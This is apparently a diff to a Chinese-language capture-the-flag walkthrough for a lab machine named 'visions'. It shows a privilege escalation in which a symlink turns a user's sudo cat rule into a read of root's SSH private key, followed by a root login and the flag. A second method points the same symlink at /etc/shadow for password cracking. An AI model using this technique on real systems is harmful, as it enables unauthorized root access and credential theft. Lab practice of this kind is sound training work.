@@ -108,9 +108,53 @@ invisible        (id_rsa)
 ```
 
 ```c
+chmod 600 id_rsa
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ sudo ssh -i id_rsa isabella@192.168.44.136  //invisible
 ```
 #  软链接提权
 
 ## 这里 sudo 具有root 的权限，sophia 用户具有使用 Sudo 读取 /home/isabella/.invisible 的权限，而现在的 isabella 用户有权限修改 /home/isabella/.invisible。我们尝试创建一条软链接，将.invisiblla文件链接到root的私钥上
+
+```C
+isabella@visions:~$ cp .invisible .invisible.bak
+isabella@visions:~$ rm -rf ./.invisible
+isabella@visions:~$ ln -s /root/.ssh/id_rsa ./.invisible
+
+sophia@visions:/home$ sudo /usr/bin/cat /home/isabella/.invisible
+```
+
+读取到root的私钥，获得第二个flag
+```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ vim root_rsa
+                                                                             
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ chmod 600 root_rsa    
+                                                                             
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ ssh -i root_rsa root@192.168.44.136                     
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 17 13:10:34 2024
+root@visions:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@visions:~# ls
+flag.sh  root.txt
+root@visions:~# cat root.txt 
+hmvitspossible
+```
+
+## 方法二
+hadow爆破
+使用上面的方法，换个思路，读取root的shadow 文件，然后进行爆破
+```C
+isabella@visions:~$ ln -s /etc/shadow ./.invisible
+```
+这里太久了，了解思路即可。完全爆破需要很长时间。0.99%
